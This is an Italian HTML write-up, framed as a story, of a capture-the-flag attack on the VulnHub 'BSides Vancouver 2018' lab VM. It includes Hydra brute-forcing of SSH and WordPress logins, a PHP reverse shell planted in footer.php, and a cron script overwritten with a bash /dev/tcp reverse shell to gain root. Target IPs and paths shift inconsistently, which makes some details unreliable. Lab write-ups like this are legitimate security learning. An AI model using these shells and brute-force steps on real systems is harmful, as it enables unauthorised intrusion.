@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>ShadowByte: Missione CryptoShield - Report Dettagliato per Parrot</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f0f0f0; color: #333; line-height: 1.6; }
+        h1 { color: #2c3e50; text-align: center; font-size: 2.5em; margin-bottom: 20px; }
+        h2 { color: #34495e; border-bottom: 2px solid #3498db; padding-bottom: 10px; font-size: 1.8em; margin-top: 40px; }
+        h3 { color: #34495e; font-size: 1.5em; margin-top: 20px; }
+        p { margin: 15px 0; }
+        pre { background-color: #ecf0f1; padding: 15px; border-radius: 5px; font-family: 'Courier New', Courier, monospace; overflow-x: auto; }
+        code { font-family: 'Courier New', Courier, monospace; }
+        .analogia { font-style: italic; color: #7f8c8d; }
+        .citazione { font-style: italic; color: #e74c3c; }
+        .immagine { text-align: center; margin: 20px 0; font-style: italic; color: #555; }
+        ul, ol { margin: 15px 0; padding-left: 30px; }
+        li { margin-bottom: 10px; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
+        th { background-color: #3498db; color: white; }
+        .highlight { background-color: #fff3cd; padding: 2px 5px; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <h1>ShadowByte: Missione CryptoShield</h1>
+    <p><em>Un report dettagliato di penetration testing per CryptoShield</em></p>
+    <p><strong>Autore:</strong> Salvatore Saitta (aka ShadowByte)</p>
+    <p><strong>Data:</strong> 20 Giugno 2025</p>
+
+    <h2>1. Introduzione: Un Messaggio dal Dark Web</h2>
+    <p>Sono ShadowByte, un ethical hacker che opera nelle profondità del dark web. Un messaggio criptato mi ha contattato per conto di CryptoShield, una startup unicorno guidata da un enigmatico proprietario. La missione? Testare la loro VM vulnerabile "BSides Vancouver 2018" (<a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">VulnHub</a>), ottenere privilegi di root e catturare la flag in <code>/root</code>. Sul dark web, il loro leader è una figura leggendaria, un vecchio amico che non sa che io, ShadowByte, lo conosco bene.</p>
+    <p>Con Linux Parrot Security e il suo tool esclusivo <strong>Anonsurf</strong>, sono pronto a dimostrare le mie abilità. Questo report, dettagliato e accessibile, documenta ogni passo, con comandi specifici di Parrot e due percorsi di attacco (FTP/SSH e WordPress).</p>
+    <p><span class="analogia">È come danzare in un gioco di ombre, sapendo che il tuo partner è un maestro mascherato.</span></p>
+
+    <h2>2. Setup: Preparare l’Ombra</h2>
+    <p>Ho scaricato la VM da VulnHub e l’ho importata in VirtualBox, impostando la rete in modalità <strong>host-only</strong> (subnet 192.168.56.0/24). La mia macchina Parrot ha IP 192.168.56.1.</p>
+    <p>Per muovermi in incognito, attivo <strong>Anonsurf</strong>, unico di Parrot, che instrada il traffico tramite Tor:</p>
+    <pre>sudo anonsurf start</pre>
+    <p><strong>Risultato:</strong> Traffico mascherato. Verifico:</p>
+    <pre>sudo anonsurf status</pre>
+    <p>Ho installato Nessus su Parrot, scaricando il pacchetto Debian da <a href="https://www.tenable.com/downloads/nessus">Tenable</a>:</p>
+    <pre>
+sudo dpkg -i Nessus-*.deb
+sudo systemctl start nessusd
+    </pre>
+    <p>Accesso su <code>https://localhost:8834</code>. Verifico la connettività:</p>
+    <pre>ping 192.168.56.52</pre>
+    <p><strong>Risultato:</strong> VM raggiungibile.</p>
+    <p><span class="analogia">È come calarsi un cappuccio nero prima di un’operazione notturna.</span></p>
+
+<img src="screenshots/virtualbox_setup.png" alt="Configurazione VirtualBox" style="max-width: 100%;">
+<img src="screenshots/anonsurf_status.png" alt="Anonsurf attivo" style="max-width: 100%;">
+    <h2>3. Host Discovery: Individuare la Preda</h2>
+    <p>Con Anonsurf attivo, uso <strong>Nmap</strong> per scansionare la rete:</p>
+    <pre>sudo nmap -sn 192.168.56.0/24 --dns-servers 8.8.8.8</pre>
+
+    <pre>
+
+    </pre>
+    <p>La VM è a <code>192.168.56.52</code>.</p>
+    <p><span class="analogia">È come captare un segnale nella nebbia, sapendo che il tuo obiettivo è vicino.</span></p>
+
+<img src="screenshots/nmap_host_discovery.png" alt="Nmap con Anonsurf" style="max-width: 100%;">
+
+    <h2>4. Vulnerability Assessment: Esplorare le Crepe</h2>
+    <p>Analizzo la VM con <strong>Nmap</strong> e <strong>Nessus</strong> su Parrot.</p>
+
+    <h3>4.1 Scansione con Nmap</h3>
+    <p>Eseguo una scansione approfondita:</p>
+    <pre>sudo nmap -sV -A -p- 192.168.56.52 --dns-servers 8.8.8.8</pre>
+    <p><strong>Spiegazione:</strong></p>
+    <ul>
+        <li><code>-sV</code>: Versioni dei servizi.</li>
+        <li><code>-A</code>: Scansioni aggressive con script NSE.</li>
+        <li><code>-p-</code>: Tutte le porte TCP.</li>
+        <li><code>--dns-servers</code>: Compatibilità con Tor.</li>
+    </ul>
+ 
+    </pre>
+    <p>Servizi: FTP, SSH, HTTP. Sistema: Ubuntu 12.04.</p>
+<img src="screenshots/nmap_service_scan.png" alt="output di Nmap" style="max-width: 100%;">
+
+    <h3>4.2 Scansione con Nessus</h3>
+    <p>Configuro Nessus su <code>https://localhost:8834</code>, creando una scansione “Basic Network Scan” per 192.168.56.101:</p>
+    <pre>sudo systemctl status nessusd</pre>
+    <p><strong>Risultato:</strong> 52 vulnerabilità:</p>
+    <table>
+        <tr>
+            <th>Vulnerabilità</th>
+            <th>Gravità</th>
+            <th>Descrizione</th>
+        </tr>
+        <tr>
+            <td>Sistema obsoleto</td>
+            <td>Critica</td>
+            <td>Ubuntu 12.04 senza aggiornamenti.</td>
+        </tr>
+        <tr>
+            <td>FTP anonimo</td>
+            <td>Alta</td>
+            <td>Accesso senza autenticazione.</td>
+        </tr>
+        <tr>
+            <td>SSH cifrature deboli</td>
+            <td>Media</td>
+            <td>OpenSSH 5.9p1 vulnerabile.</td>
+        </tr>
+        <tr>
+            <td>Apache obsoleto</td>
+            <td>Media</td>
+            <td>Apache 2.2.22 con bug noti.</td>
+        </tr>
+        <tr>
+            <td>WordPress vulnerabile</td>
+            <td>Alta</td>
+            <td>Versione obsoleta su /blog.</td>
+        </tr>
+    </table>
+    <p><span class="analogia">È come scrutare un antico manoscritto, cercando i punti deboli nascosti.</span></p>
+<img src="screenshots/nessus_report.png" alt="risultati di Nessus" style="max-width: 100%;">
+
+    <h2>5. Exploitation: Aprire la Porta</h2>
+    <p>Esploro due percorsi: SSH e FTP e scopro WordPress abbandonato</p>
+
+    <h3>5.1 Percorso 1: FTP e SSH</h3>
+    <p>Il login FTP anonimo è una falla. Mi connetto:</p>
+    <pre>ftp 192.168.56.52</pre>
+    <p><strong>Risultato:</strong></p>
+    <pre>
+Connected to 192.168.56.52.
+220 (vsFTPd 2.3.5)
+Name (192.168.56.101:shadowbyte): anonymous
+331 Please specify the password.
+Password: [vuoto]
+230 Login successful.
+    </pre>
+    <p>Trovo <code>users.txt.bk</code> in <code>public</code>:</p>
+    <pre>
+cd public
+ls
+get users.txt.bk
+quit
+    </pre>
+    <p><strong>Contenuto:</strong> <code>anne,john,mary,jane,david,lisa</code>. Un indizio lasciato da qualcuno che conosce il gioco.</p>
+    <p>Uso <strong>Hydra</strong> con la wordlist di Parrot:</p>
+    <pre>
+gunzip /usr/share/wordlists/rockyou.txt.gz
+hydra -L users.txt.bk -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.52
+    </pre>
+    <p><strong>Risultato:</strong> <code>anne:princess</code>. Mi connetto:</p>
+    <pre>ssh anne@192.168.56.101</pre>
+    <p><strong>Risultato:</strong> Accesso come <code>anne</code>.</p>
+    <p><span class="analogia">È come trovare una chiave nascosta sotto un sasso familiare.</span></p>
+<img src="screenshots/ftp_access.png" alt="connessione FTP" style="max-width: 100%;">    
+<img src="screenshots/ssh_access.png" alt="connessione SSH" style="max-width: 100%;">
+
+    <h3>5.2 Scoperta : WordPress</h3>
+    <p>Su <code>192.168.56.52/wordpress_backup/</code> c’è un sito WordPress <code>wp-login.php</code>:</p>
+    <pre>hydra -L users.txt.bk -P /usr/share/wordlists/rockyou.txt http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"</pre>
+    <p><strong>Risultato:</strong> <code>john:enigma</code>. Un nome che sa di dark web.</p>
+    <p>Accedo al pannello Admin e modifico <code>footer.php</code>:</p>
+    <pre><?php system("bash -i >& /dev/tcp/192.168.56.1/8888 0>&1"); ?></pre>
+    <p>Imposto un listener:</p>
+    <pre>netcat -lvp 8888</pre>
+    <p><strong>Risultato:</strong> Shell come <code>www-data</code>.</p>
+    <p><span class="analogia">È come scivolare attraverso una finestra lasciata socchiusa.</span></p>
+<img src="screenshots/wordpress_admin.png" alt="pannello wordpress" style="max-width: 100%;">
+
+    <h2>6. Post-Exploitation: Raggiungere il Vertice</h2>
+    <p>Come <code>anne</code>, verifico i privilegi:</p>
+    <pre>sudo -l</pre>
+    <p><strong>Risultato:</strong></p>
+    <pre>
+User anne may run: (ALL) NOPASSWD: ALL
+    </pre>
+    <p>Escalo:</p>
+    <pre>sudo su</pre>
+    <p>Verifico:</p>
+    <pre>whoami</pre>
+    <p><strong>Risultato:</strong> <code>root</code>.</p>
+    <p>Per WordPress, come <code>www-data</code>, trovo uno script cron (<code>/usr/local/bin/cleanup</code>):</p>
+    <pre>
+echo "bash -i >& /dev/tcp/192.168.56.1/8888 0>&1" > /usr/local/bin/cleanup
+chmod +x /usr/local/bin/cleanup
+    </pre>
+    <p>Ottengo una shell root via Netcat.</p>
+    <p><span class="analogia">È come scoprire un passaggio segreto verso la torre più alta.</span></p>
+
+
+
+<img src="screenshots/ssh_privilege_escalation.png" alt="escalation" style="max-width: 100%;">
+
+    <h2>7. Flag Capture: Il Premio</h2>
+    <p>Come root:</p>
+    <pre>
+cd /root
+ls -la
+cat flag.txt
+    </pre>
+    <p><strong>Risultato:</strong></p>
+    <pre>Congratulations! If you can read this, you have root permissions!</pre>
+    <p>Flag catturata.</p>
+    <p><span class="analogia">È come aprire un baule e trovare un tesoro ben custodito.</span></p>
+<img src="screenshots/flag_capture.png" alt="flag" style="max-width: 100%;">
+
+    <h2>8. Analisi delle Vulnerabilità</h2>
+    <p>Vulnerabilità sfruttate:</p>
+    <table>
+        <tr>
+            <th>Vulnerabilità</th>
+            <th>Impatto</th>
+            <th>Mitigazione</th>
+        </tr>
+        <tr>
+            <td>FTP anonimo</td>
+            <td>Accesso non autorizzato</td>
+            <td>Disabilitare login anonimo</td>
+        </tr>
+        <tr>
+            <td>Password deboli</td>
+            <td>Accesso tramite brute-force</td>
+            <td>Password complesse, 2FA</td>
+        </tr>
+        <tr>
+            <td>Sudo mal configurato</td>
+            <td>Escalation di privilegi</td>
+            <td>Limitare permessi sudo</td>
+        </tr>
+        <tr>
+            <td>WordPress obsoleto</td>
+            <td>Accesso admin e shell</td>
+            <td>Aggiornare WordPress</td>
+        </tr>
+    </table>
+
+    <h2>9. Considerazioni Etiche</h2>
+    <p>Opero con autorizzazione in un ambiente controllato. Best practices:</p>
+    <ul>
+        <li>Aggiornare software.</li>
+        <li>Disabilitare servizi inutili.</li>
+        <li>Password robuste.</li>
+        <li>Monitorare log.</li>
+        <li>Firewall e IDS.</li>
+    </ul>
+    <p><span class="analogia">È come fortificare una città contro invasori futuri.</span></p>
+
+    <h2>10. Conclusioni: Un Sussurro nel Dark Web</h2>
+    <p>Questa missione ha dimostrato che anche un sistema ben progettato può cadere. Ho affinato le mie abilità con Parrot e Anonsurf, consegnando un report che evidenzia le vulnerabilità di CryptoShield. Dopo aver inviato il report, ricevo un messaggio criptato dal loro leader:</p>
+    <p><span class="citazione">“ShadowByte, il tuo stile mi ricorda un’ombra del passato… ma i veri maestri restano nascosti, no?”</span></p>
+    <p>Sorrido. Forse il capo di CryptoShield, il Dott. Castelli, teme che io sappia che è uno degli ethical hacker più grandi di tutti i tempi. Non lo confermerò… per ora.</p>
+    <p><em>Firmato: ShadowByte, il tuo hacker etico dal dark web.</em></p>
+</body>
+</html>
